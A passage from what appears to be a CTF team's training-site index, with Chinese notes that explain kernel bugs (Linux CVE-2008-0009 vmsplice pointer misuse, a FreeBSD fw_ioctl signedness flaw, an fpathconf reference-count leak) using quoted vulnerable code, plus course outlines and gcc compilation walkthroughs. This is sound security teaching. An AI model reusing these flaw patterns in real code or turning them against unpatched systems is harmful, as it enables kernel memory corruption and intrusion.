u3002</p> <p>\u770b\u4e00\u4e2a Linux \u7684\u4f8b\u5b50\uff0cCVE-2008-0009\uff1a</p> <pre><code>    error = get_user(base, &amp;iov-&gt;iov_base);     // [1]\n    [...]\n    if (unlikely(!base)) {\n        error = -EFAULT;\n        break;\n    }\n    [...]\n    sd.u.userptr = base;                        // [2]\n    [...]\n    size = __splice_from_pipe(pipe, &amp;sd, pipe_to_user);\n[...]\nstatic int pipe_to_user(struct pipe_inode_info *pipe, struct pipe_buffer *buf, struct splice_desc *sd)\n{\n    if (!fault_in_pages_writeable(sd-&gt;u.userptr, sd-&gt;len)) {\n        src = buf-&gt;ops-&gt;map(pipe, buf, 1);\n        ret = __copy_to_user_inatomic(sd-&gt;u.userptr, src + buf-&gt;offset, sd-&gt;len);                               // [3]\n        buf-&gt;ops-&gt;unmap(pipe, buf, src);\n[...]\n}\n</code></pre> <p>\u4ee3\u7801\u7684\u7b2c\u4e00\u90e8\u5206\u6765\u81ea\u51fd\u6570 <code>vmsplice_to_user()</code>\uff0c\u5728 [1] \u5904\u4f7f\u7528\u4e86 <code>get_user()</code> \u83b7\u5f97\u4e86\u76ee\u7684\u6307\u9488\u3002\u8be5\u76ee\u7684\u6307\u9488\u672a\u7ecf\u68c0\u67e5\u5c31\u9ed8\u8ba4\u5b83\u662f\u4e00\u4e2a\u7528\u6237\u5730\u5740\u6307\u9488\uff0c\u7136\u540e\u901a\u8fc7 [2] \u4f20\u9012\u7ed9\u4e86 <code>__splice_from_pipe()</code>\uff0c\u540c\u65f6\u4f20\u9012\u51fd\u6570 <code>pipe_to_user</code> \u4f5c\u4e3a helper function\u3002\u8fd9\u4e2a\u51fd\u6570\u4f9d\u7136\u662f\u672a\u7ecf\u68c0\u67e5\u5c31\u8c03\u7528\u4e86 <code>__copy_to_user_inatomic()</code>[3]\uff0c\u5bf9\u8be5\u6307\u9488\u505a\u89e3\u5f15\u7528\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u653b\u51fb\u8005\u4f20\u9012\u7684\u662f\u4e00\u4e2a\u5185\u6838\u5730\u5740\uff0c\u5219\u5229\u7528\u8be5\u6f0f\u6d1e\u80fd\u591f\u5199\u5165\u4efb\u610f\u6570\u636e\u5230\u4efb\u610f\u7684\u5185\u6838\u5185\u5b58\u4e2d\u3002\u8fd9\u91cc\u8981\u77e5\u9053\u7684\u8fd8\u6709 Linux \u4e2d\u4ee5\u4e24\u4e2a\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u51fd\u6570\uff08\u4f8b\u5982 <code>__copy_to_user_inatomic()</code>\uff09\u662f\u4e0d\u4f1a\u5bf9\u6240\u63d0\u4f9b\u7684\u76ee\u7684\uff08\u6216\u6e90\uff09\u7528\u6237\u6307\u9488\u505a\u4efb\u4f55\u68c0\u67e5\u7684\u3002</p> <p>\u6700\u540e\uff0c\u4e00\u4e2a\u88ab\u635f\u574f\u7684\u6307\u9488\u5f80\u5f80\u662f\u5176\u4ed6\u6f0f\u6d1e\u7684\u7ed3\u679c\uff08\u4f8b\u5982\u7f13\u51b2\u533a\u6ea2\u51fa\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u6307\u9488\u7684\u5185\u5bb9\uff0c\u83b7\u5f97\u66f4\u591a\u7684\u63a7\u5236\u6743\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_28","title":"\u5185\u5b58\u7834\u574f\u6f0f\u6d1e","text":"<p>\u8fd9\u7c7b\u6f0f\u6d1e\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u9519\u8bef\u64cd\u4f5c\u91cd\u5199\u4e86\u5185\u6838\u7a7a\u95f4\u7684\u5185\u5b58\uff08\u5305\u62ec\u5185\u6838\u6808\u548c\u5185\u6838\u5806\uff09\u5bfc\u81f4\u7684\u3002</p> <p>\u5185\u6838\u6808\u5728\u6bcf\u6b21\u8fdb\u7a0b\u8fdb\u5165\u5230\u5185\u6838\u6001\u65f6\u53d1\u6325\u4f5c\u7528\u3002\u5185\u6838\u6808\u4e0e\u7528\u6237\u6808\u57fa\u672c\u76f8\u540c\uff0c\u4f46\u4e5f\u6709\u4e00\u4e9b\u7ec6\u5c0f\u7684\u5dee\u522b\uff0c\u4f8b\u5982\u5b83\u7684\u5927\u5c0f\u901a\u5e38\u662f\u53d7\u9650\u5236\u7684\u3002\u53e6\u5916\uff0c\u6240\u6709\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u90fd\u662f\u4e00\u5757\u76f8\u540c\u7684\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u6240\u4ee5\u4ed6\u4eec\u5f00\u59cb\u4e8e\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\u5e76\u4e14\u5360\u636e\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002</p> <p>\u7531\u4e8e\u5185\u6838\u6808\u4e0e\u7528\u6237\u6808\u7684\u76f8\u4f3c\u6027\uff0c\u5176\u53d1\u751f\u6f0f\u6d1e\u7684\u5730\u65b9\u4e5f\u5927\u4f53\u76f8\u540c\uff0c\u4f8b\u5982\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u51fd\u6570\uff08<code>strcpy()</code>, <code>sprintf()</code> \u7b49\uff09\uff0c\u6570\u7ec4\u8d8a\u754c\uff0c\u7f13\u51b2\u533a\u6ea2\u51fa\u7b49\u3002</p> <p>\u9488\u5bf9\u5185\u6838\u5806\u7684\u6f0f\u6d1e\u5f80\u5f80\u662f\u7f13\u51b2\u533a\u6ea2\u51fa\u9020\u6210\u7684\u3002\u901a\u8fc7\u6ea2\u51fa\uff0c\u91cd\u5199\u4e86\u6ea2\u51fa\u5757\u540e\u9762\u7684\u5757\uff0c\u6216\u8005\u91cd\u5199\u4e86\u7f13\u5b58\u76f8\u5173\u7684\u5143\u6570\u636e\uff0c\u90fd\u53ef\u80fd\u9020\u6210\u6f0f\u6d1e\u5229\u7528\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_29","title":"\u6574\u6570\u8bef\u7528","text":"<p>\u6574\u6570\u6ea2\u51fa\u548c\u7b26\u53f7\u8f6c\u6362\u9519\u8bef\u662f\u6700\u5e38\u89c1\u7684\u4e24\u79cd\u6574\u6570\u8bef\u7528\u6f0f\u6d1e\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u5f80\u5f80\u4e0d\u5bb9\u6613\u5355\u72ec\u5229\u7528\uff0c\u4f46\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53e6\u5916\u7684\u4e00\u4e9b\u6f0f\u6d1e\uff08\u4f8b\u5982\u5185\u5b58\u6ea2\u51fa\uff09\u7684\u53d1\u751f\u3002</p> <p>\u6574\u6570\u6ea2\u51fa\u53d1\u751f\u5728\u5c06\u4e00\u4e2a\u8d85\u51fa\u6574\u6570\u6570\u636e\u5b58\u50a8\u8303\u56f4\u7684\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u6574\u6570\u53d8\u91cf\u3002\u5728\u4e0d\u52a0\u63a7\u5236\u7684\u52a0\u6cd5\u548c\u4e58\u6cd5\u8fd0\u7b97\u4e2d\u5982\u679c\u5806\u53c2\u89c1\u8fd0\u7b97\u7684\u53c2\u6570\u4e0d\u52a0\u9a8c\u8bc1\uff0c\u4e5f\u6709\u53ef\u80fd\u53d1\u751f\u6574\u6570\u6ea2\u51fa\u3002</p> <p>\u7b26\u53f7\u8f6c\u6362\u9519\u8bef\u53d1\u751f\u5728\u5c06\u4e00\u4e2a\u65e0\u7b26\u53f7\u6570\u5f53\u505a\u6709\u7b26\u53f7\u6570\u5904\u7406\u7684\u65f6\u5019\u3002\u4e00\u4e2a\u7ecf\u5178\u7684\u573a\u666f\u662f\uff0c\u4e00\u4e2a\u6709\u7b26\u53f7\u6570\u7ecf\u8fc7\u67d0\u4e2a\u6700\u5927\u503c\u68c0\u6d4b\u540e\u4f20\u5165\u4e00\u4e2a\u51fd\u6570\uff0c\u800c\u8fd9\u4e2a\u51fd\u6570\u53ea\u63a5\u6536\u65e0\u7b26\u53f7\u6570\u3002</p> <p>\u770b\u4e00\u4e2a FreeBSD V6.0 \u7684\u4f8b\u5b50\uff1a</p> <pre><code>int fw_ioctl (struct cdev *dev, u_long cmd, caddr_t data, int flag, fw_proc *td)\n{\n[...]\n    int s, i, len, err = 0;                                     [1]\n    [...]\n    struct fw_crom_buf *crom_buf = (struct fw_crom_buf *)data;  [2]\n    [...]\n    if (fwdev == NULL) {\n    [...]\n        len = CROMSIZE;\n    [...]\n    } else {\n    [...]\n        if (fwdev-&gt;rommax &lt; CSRROMOFF)\n            len = 0;\n        else\n            len = fwdev-&gt;rommax - CSRROMOFF + 4;\n    }\n    if (crom_buf-&gt;len &lt; len)                                    [3]\n        len = crom_buf-&gt;len;\n    else\n        crom_buf-&gt;len = len;\n    err = copyout(ptr, crom_buf-&gt;ptr, len);                     [4]\n}\n</code></pre> <p>[1] \u5904\u7684 <code>len</code> \u662f\u6709\u7b26\u53f7\u6574\u6570\uff0c<code>crom_buf-&gt;len</code> \u4e5f\u662f\u6709\u7b26\u53f7\u6570\u5e76\u4e14\u8be5\u503c\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\uff0c\u5982\u679c\u5b83\u88ab\u8bbe\u4e3a\u4e00\u4e2a\u8d1f\u6570\uff0c\u90a3\u4e48\u65e0\u8bba <code>len</code> \u7684\u503c\u662f\u4ec0\u4e48\uff0c[3] \u5904\u7684\u6761\u4ef6\u90fd\u4f1a\u6ee1\u8db3\u3002\u7136\u540e\u5728 [4] \u5904\uff0c<code>copyout()</code> \u88ab\u8c03\u7528\uff0c\u8be5\u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a</p> <pre><code>int copyout(const void *__restrict kaddr, void *__restrict udaddr, size_t len) __nonnull(1) __nonnull(2);\n</code></pre> <p>\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u7c7b\u578b <code>size_t</code> \u662f\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u6240\u4ee5\u5f53 <code>len</code> \u662f\u4e00\u4e2a\u8d1f\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6b63\u6574\u6570\uff0c\u9020\u6210\u4efb\u610f\u5185\u6838\u5185\u5b58\u8bfb\u53d6\u3002</p> <p>\u66f4\u591a\u5185\u5b58\u53ef\u4ee5\u53c2\u89c1\u7ae0\u8282 3.1.2\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_30","title":"\u7ade\u6001\u6761\u4ef6","text":"<p>\u5982\u679c\u6709\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u6267\u884c\u8005\u5c06\u8981\u6267\u884c\u67d0\u4e00\u52a8\u4f5c\u5e76\u4e14\u6267\u884c\u7ed3\u679c\u4f1a\u7531\u4e8e\u5b83\u4eec\u6267\u884c\u987a\u5e8f\u7684\u4e0d\u540c\u800c\u5b8c\u5168\u4e0d\u540c\u65f6\uff0c\u4e5f\u5c31\u662f\u53d1\u751f\u4e86\u7ade\u4e89\u6761\u4ef6\u3002\u907f\u514d\u7ade\u4e89\u6761\u4ef6\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f8b\u5982\u901a\u8fc7\u9501\u3001\u4fe1\u53f7\u91cf\u3001\u6761\u4ef6\u53d8\u91cf\u7b49\u6765\u4fdd\u8bc1\u5404\u79cd\u884c\u52a8\u8005\u4e4b\u95f4\u7684\u540c\u6b65\u6027\u3002\u7ade\u4e89\u6761\u4ef6\u4e2d\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f\u53ef\u7ade\u4e89\u7a97\u53e3\u7684\u5927\u5c0f\uff0c\u5b83\u5bf9\u4e8e\u89e6\u53d1\u7ade\u6001\u6761\u4ef6\u7684\u96be\u6613\u81f3\u5173\u91cd\u8981\uff0c\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u4e00\u4e9b\u7ade\u6001\u6761\u4ef6\u7684\u60c5\u51b5\u53ea\u80fd\u5728\u5bf9\u79f0\u591a\u5904\u7406\u5668\uff08SMP\uff09\u4e2d\u88ab\u5229\u7528\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#bug","title":"\u903b\u8f91 bug","text":"<p>\u903b\u8f91 bug \u6709\u5f88\u591a\u79cd\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\u5668\u6ea2\u51fa\u3002\u6211\u4eec\u77e5\u9053\u5171\u4eab\u8d44\u6e90\u90fd\u6709\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\uff0c\u5e76\u5728\u8ba1\u6570\u4e3a\u96f6\u65f6\u91ca\u653e\u6389\u8d44\u6e90\uff0c\u4fdd\u6301\u8db3\u591f\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u64cd\u4f5c\u7cfb\u7edf\u5f80\u5f80\u63d0\u4f9b get \u548c put/drop \u8fd9\u6837\u7684\u51fd\u6570\u6765\u663e\u5f0f\u5730\u589e\u52a0\u548c\u51cf\u5c11\u5f15\u7528\u8ba1\u6570\u3002</p> <p>\u770b\u4e00\u4e2a FreeBSD V5.0 \u7684\u4f8b\u5b50\uff1a</p> <pre><code>int fpathconf(td, uap)\n    struct thread *td;\n    register struct fpathconf_args *uap;\n{\n    struct file *fp;\n    struct vnode *vp;\n    int error;\n    if ((error = fget(td, uap-&gt;fd, &amp;fp)) != 0)      [1]\n        return (error);\n[...]\n    switch (fp-&gt;f_type) {\n    case DTYPE_PIPE:\n    case DTYPE_SOCKET:\n        if (uap-&gt;name != _PC_PIPE_BUF)\n            return (EINVAL);                        [2]\n        p-&gt;p_retval[0] = PIPE_BUF;\n        error = 0;\n        break;\n[...]\nout:\n    fdrop(fp, td);                                  [3]\n    return (error);\n}\n</code></pre> <p><code>fpathconf()</code> \u7cfb\u7edf\u8c03\u7528\u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u7279\u5b9a\u7684\u5f00\u653e\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4fe1\u606f\u3002\u6240\u4ee5\u8be5\u8c03\u7528\u5f00\u5934 [1] \u5904\u901a\u8fc7 <code>fget()</code> \u83b7\u53d6\u8be5\u6587\u4ef6\u63cf\u8ff0\u7b26\u7ed3\u6784\u7684\u5f15\u7528\uff0c\u7136\u540e\u5728\u9000\u51fa\u7684\u65f6\u5019 [3] \u5904\u901a\u8fc7 <code>fdrop()</code> \u91ca\u653e\u8be5\u5f15\u7528\u3002\u7136\u800c\u5728 [2] \u5904\u7684\u4ee3\u7801\u6ca1\u6709\u91ca\u653e\u76f8\u5173\u7684\u5f15\u7528\u8ba1\u6570\u5c31\u76f4\u63a5\u8fd4\u56de\u4e86\u3002\u5982\u679c\u591a\u6b21\u8c03\u7528 <code>fpathconf()</code> \u5e76\u89e6\u53d1 [2] \u5904\u7684\u8fd4\u56de\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u5f15\u7528\u8ba1\u6570\u5668\u7684\u6ea2\u51fa\u3002</p>"},{"location":"Training/Material/Cryptography/","title":"Modern Cryptography and Mathematics","text":""},{"location":"Training/Material/Cryptography/#introduction","title":"Introduction","text":"<p>Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography.</p> <p>Several cryptography methods are illustrated in this course, while you would learn how to perform cryptography attacks. Remember the key point: do not create a cryptography model without mathematics proof.</p>"},{"location":"Training/Material/Cryptography/#material","title":"Material","text":"<ul> <li>Cryptography Theory and Practice</li> <li> <p>Introduction to Modern Cryptography: Principles and Protocols</p> </li> <li> <p>\u65b0\u7248\u6697\u53f7\u6280\u8853\u5165\u9580: \u79d8\u5bc6\u306e\u56fd\u306e\u30a2\u30ea\u30b9</p> </li> </ul>"},{"location":"Training/Material/Cryptography/#component","title":"Component","text":"<ol> <li>Modern Cryptography and Perfectly Secret Encryption</li> <li>Private-Key Encryption</li> <li>Message Authentication Codes &amp; Hash Functions</li> <li>Public-Key Cryptography</li> <li>Attack RSA and ECC</li> </ol>"},{"location":"Training/Material/Cryptography/#download","title":"Download","text":"<p>Cryptography.pptx</p>"},{"location":"Training/Material/Network/","title":"Computer Network","text":""},{"location":"Training/Material/Network/#introduction","title":"Introduction","text":"<p>About computer network, how Internet works and basic protocols about computer network.</p> <p>Computer network is the basic course for Web challenges. Learning about Computer Network and learn about networking protocols, vulnerabilities, and key ideas of network traffic.</p>"},{"location":"Training/Material/Network/#material","title":"Material","text":"<p>Computer Networking: A Top-Down Approach</p> <p>(Optional) TCP / IP Illustrated Volume 1, 2, 3</p>"},{"location":"Training/Material/Network/#component","title":"Component","text":"<ol> <li>Computer Network and the Internet</li> <li>Application Layer: HTTP &amp; DNS</li> <li>Transmission Layer: TCP &amp; UDP</li> <li>Network Layer: IP</li> <li>Link Layer and LAN</li> </ol>"},{"location":"Training/Material/Network/#download","title":"Download","text":"<p>Computer Network.pptx</p>"},{"location":"Training/Material/OS/","title":"Operating Systems","text":""},{"location":"Training/Material/OS/#introduction","title":"Introduction","text":"<p>Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure.</p>"},{"location":"Training/Material/OS/#material","title":"Material","text":"<p>Computer Systems: A Programmer's Perspective</p>"},{"location":"Training/Material/OS/#component","title":"Component","text":"<ol> <li>Overview of Operating Systems</li> <li>Storage of Information and Program</li> <li>CPU Structure and Compiling of Program</li> <li>Storage Hierarchy</li> <li>Running of Program</li> <li>Exception and Interrupt Handling</li> <li>IO and Networking</li> </ol>"},{"location":"Training/Material/OS/#download","title":"Download","text":"<p>Operating Systems.pptx</p>"},{"location":"Training/Material/Penetration/","title":"Penetration Testing","text":""},{"location":"Training/Material/Penetration/#introduction","title":"Introduction","text":"<p>From CTF challenges to the penetration testing and hacking a real system. Learn about how to carry out a real attack to the computer systems.</p> <p>Aim in AWD (Attack &amp; Defense) CTF and learn how to penetration testing.</p>"},{"location":"Training/Material/Penetration/#material","title":"Material","text":"<p>The Hacker Playbook</p>"},{"location":"Training/Material/Penetration/#component","title":"Component","text":"<ol> <li>Environment Settings</li> <li>Information Gathering</li> <li>Web Application Exploiting</li> <li>Network Attack</li> <li>Other Attacking Methods</li> </ol>"},{"location":"Training/Material/Penetration/#download","title":"Download","text":"<p>Penetration.pptx</p>"},{"location":"Training/Material/Reverse/","title":"\u9006\u5411\u5de5\u7a0b\u4e0e\u6c47\u7f16\u8bed\u8a00","text":""},{"location":"Training/Material/Reverse/#c","title":"C \u8bed\u8a00\u57fa\u7840","text":"<ul> <li>\u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6</li> <li>C \u8bed\u8a00\u6807\u51c6\u5e93</li> <li>\u6574\u6570\u8868\u793a</li> <li>\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570</li> <li>\u5173\u4e8e C++</li> </ul>"},{"location":"Training/Material/Reverse/#_2","title":"\u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6","text":"<p>\u6211\u4eec\u4ee5\u7ecf\u5178\u8457\u4f5c\u300aThe C Programming Language\u300b\u4e2d\u7684\u7b2c\u4e00\u4e2a\u7a0b\u5e8f \u201cHello World\u201d \u4e3a\u4f8b\uff0c\u8bb2\u89e3 Linux \u4e0b GCC \u7684\u7f16\u8bd1\u8fc7\u7a0b\u3002</p> <pre><code>#include &lt;stdio.h&gt;\nmain()\n{\n    printf(\"hello, world\\n\");\n}\n$gcc hello.c\n$./a.out\nhello world\n</code></pre> <p>\u4ee5\u4e0a\u8fc7\u7a0b\u53ef\u5206\u4e3a4\u4e2a\u6b65\u9aa4\uff1a\u9884\u5904\u7406\uff08Preprocessing\uff09\u3001\u7f16\u8bd1\uff08Compilation\uff09\u3001\u6c47\u7f16\uff08Assembly\uff09\u548c\u94fe\u63a5\uff08Linking\uff09\u3002</p> <p></p>"},{"location":"Training/Material/Reverse/#_3","title":"\u9884\u7f16\u8bd1","text":"<pre><code>gcc -E hello.c -o hello.i\n# 1 \"hello.c\"\n# 1 \"&lt;built-in&gt;\"\n# 1 \"&lt;command-line&gt;\"\n......\nextern int printf (const char *__restrict __format, ...);\n......\nmain() {\n printf(\"hello, world\\n\");\n}\n</code></pre> <p>\u9884\u7f16\u8bd1\u8fc7\u7a0b\u4e3b\u8981\u5904\u7406\u6e90\u4ee3\u7801\u4e2d\u4ee5 \u201c#\u201d \u5f00\u59cb\u7684\u9884\u7f16\u8bd1\u6307\u4ee4\uff1a</p> <ul> <li>\u5c06\u6240\u6709\u7684 \u201c#define\u201d \u5220\u9664\uff0c\u5e76\u4e14\u5c55\u5f00\u6240\u6709\u7684\u5b8f\u5b9a\u4e49\u3002</li> <li>\u5904\u7406\u6240\u6709\u6761\u4ef6\u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u5982 \u201c#if\u201d\u3001\u201c#ifdef\u201d\u3001\u201c#elif\u201d\u3001\u201c#else\u201d\u3001\u201c#endif\u201d\u3002</li> <li>\u5904\u7406 \u201c#include\u201d \u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u63d2\u5165\u5230\u8be5\u9884\u7f16\u8bd1\u6307\u4ee4\u7684\u4f4d\u7f6e\u3002\u6ce8\u610f\uff0c\u8be5\u8fc7\u7a0b\u9012\u5f52\u6267\u884c\u3002</li> <li>\u5220\u9664\u6240\u6709\u6ce8\u91ca\u3002</li> <li>\u6dfb\u52a0\u884c\u53f7\u548c\u6587\u4ef6\u540d\u6807\u53f7\u3002</li> <li>\u4fdd\u7559\u6240\u6709\u7684 #pragma \u7f16\u8bd1\u5668\u6307\u4ee4\u3002</li> </ul>"},{"location":"Training/Material/Reverse/#_4","title":"\u7f16\u8bd1","text":"<pre><code>gcc -S hello.c -o hello.s\n        .file   \"hello.c\"\n        .section        .rodata\n.LC0:\n        .string \"hello, world\"\n        .text\n        .globl  main\n        .type   main, @function\nmain:\n.LFB0:\n        .cfi_startproc\n        pushq   %rbp\n        .cfi_def_cfa_offset 16\n        .cfi_offset 6, -16\n        movq    %rsp, %rbp\n        .cfi_def_cfa_register 6\n        leaq    .LC0(%rip), %rdi\n        call    puts@PLT\n        movl    $0, %eax\n        popq    %rbp\n        .cfi_def_cfa 7, 8\n        ret\n        .cfi_endproc\n.LFE0:\n        .size   main, .-main\n        .ident  \"GCC: (GNU) 7.2.0\"\n        .section        .note.GNU-stack,\"\",@progbits\n</code></pre> <p>\u7f16\u8bd1\u8fc7\u7a0b\u5c31\u662f\u628a\u9884\u5904\u7406\u5b8c\u7684\u6587\u4ef6\u8fdb\u884c\u4e00\u7cfb\u5217\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u53ca\u4f18\u5316\u540e\u751f\u6210\u76f8\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u6587\u4ef6\u3002</p>"},{"location":"Training/Material/Reverse/#_5","title":"\u6c47\u7f16","text":"<pre><code>$ gcc -c hello.s -o hello.o\n\u6216\u8005\n$gcc -c hello.c -o hello.o\n$ objdump -sd hello.o\n\nhello.o:     file format elf64-x86-64\n\nContents of section .text:\n 0000 554889e5 488d3d00 000000e8 00000000  UH..H.=.........\n 0010 b8000000 005dc3                      .....].\nContents of section .rodata:\n 0000 68656c6c 6f2c2077 6f726c64 00        hello, world.\nContents of section .comment:\n 0000 00474343 3a202847 4e552920 372e322e  .GCC: (GNU) 7.2.\n 0010 3000                                 0.\nContents of section .eh_frame:\n 0000 14000000 00000000 017a5200 01781001  .........zR..x..\n 0010 1b0c0708 90010000 1c000000 1c000000  ................\n 0020 00000000 17000000 00410e10 8602430d  .........A....C.\n 0030 06520c07 08000000                    .R......\n\nDisassembly of section .text:\n\n0000000000000000 &lt;main&gt;:\n   0:   55                      push   %rbp\n   1:   48 89 e5                mov    %rsp,%rbp\n   4:   48 8d 3d 00 00 00 00    lea    0x0(%rip),%rdi        # b &lt;main+0xb&gt;\n   b:   e8 00 00 00 00          callq  10 &lt;main+0x10&gt;\n  10:   b8 00 00 00 00          mov    $0x0,%eax\n  15:   5d                      pop    %rbp\n  16:   c3                      retq\n</code></pre> <p>\u6c47\u7f16\u5668\u5c06\u6c47\u7f16\u4ee3\u7801\u8f6c\u53d8\u6210\u673a\u5668\u53ef\u4ee5\u6267\u884c\u7684\u6307\u4ee4\u3002</p>"},{"location":"Training/Material/Reverse/#_6","title":"\u94fe\u63a5","text":"<pre><code>gcc hello.o -o hello\n$ objdump -d -j .text hello\n......\n000000000000064a &lt;main&gt;:\n 64a:   55                      push   %rbp\n 64b:   48 89 e5                mov    %rsp,%rbp\n 64e:   48 8d 3d 9f 00 00 00    lea    0x9f(%rip),%rdi        # 6f4 &lt;_IO_stdin_used+0x4&gt;\n 655:   e8 d6 fe ff ff          callq  530 &lt;puts@plt&gt;\n 65a:   b8 00 00 00 00          mov    $0x0,%eax\n 65f:   5d                      pop    %rbp\n 660:   c3                      retq\n 661:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)\n 668:   00 00 00\n 66b:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)\n......\n</code></pre> <p>\u76ee\u6807\u6587\u4ef6\u9700\u8981\u94fe\u63a5\u4e00\u5927\u5806\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u6700\u7ec8\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e0a\u9762\u53ea\u5c55\u793a\u4e86\u94fe\u63a5\u540e\u7684 main \u51fd\u6570\uff0c\u53ef\u4ee5\u548c hello.o \u4e2d\u7684 main \u51fd\u6570\u4f5c\u5bf9\u6bd4\uff09\u3002\u94fe\u63a5\u8fc7\u7a0b\u4e3b\u8981\u5305\u62ec\u5730\u5740\u548c\u7a7a\u95f4\u5206\u914d\uff08Address and Storage Allocation\uff09\u3001\u7b26\u53f7\u51b3\u8bae\uff08Symbol Resolution\uff09\u548c\u91cd\u5b9a\u5411\uff08Relocation\uff09\u7b49\u3002</p>"},{"location":"Training/Material/Reverse/#gcc","title":"gcc \u6280\u5de7","text":"<p>\u901a\u5e38\u5728\u7f16\u8bd1\u540e\u53ea\u4f1a\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u800c\u4e2d\u95f4\u8fc7\u7a0b\u751f\u6210\u7684 <code>.i</code>\u3001<code>.s</code>\u3001<code>.o</code> \u6587\u4ef6\u90fd\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53c2\u6570 <code>-save-temps</code> \u6c38\u4e45\u4fdd\u5b58\u8fd9\u4e9b\u4e34\u65f6\u7684\u4e2d\u95f4\u6587\u4ef6\u3002</p> <pre><code>$ gcc -save-temps hello.c\n$ ls\na.out hello.c  hello.i  hello.o  hello.s\n</code></pre> <p>\u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\uff0cgcc \u9ed8\u8ba4\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u6240\u4ee5\u8fd9\u91cc\u751f\u6210\u7684 a.out \u5b9e\u9645\u4e0a\u662f\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002</p> <pre><code>$ file a.out\na.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=533aa4ca46d513b1276d14657ec41298cafd98b1, not stripped\n</code></pre> <p>\u4f7f\u7528\u53c2\u6570 <code>--verbose</code> \u53ef\u4ee5\u8f93\u51fa gcc \u8be6\u7ec6\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002</p> <pre><code>gcc hello.c -static --verbose\n</code></pre> <p>\u4e1c\u897f\u5f88\u591a\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e0b\u9762\u51e0\u6761\u4fe1\u606f\uff1a</p> <pre><code>$ /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/cc1 -quiet -v hello.c -quiet -dumpbase hello.c -mtune=generic -march=x86-64 -auxbase hello -version -o /tmp/ccj1jUMo.s\n\nas -v --64 -o /tmp/ccAmXrfa.o /tmp/ccj1jUMo.s\n\n/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/collect2 -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/lto-wrapper -plugin-opt=-fresolution=/tmp/cc1l5oJV.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lc --build-id --hash-style=gnu -m elf_x86_64 -static /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crt1.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crti.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/crtbeginT.o -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0 -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib -L/lib/../lib -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../.. /tmp/ccAmXrfa.o --start-group -lgcc -lgcc_eh -lc --end-group 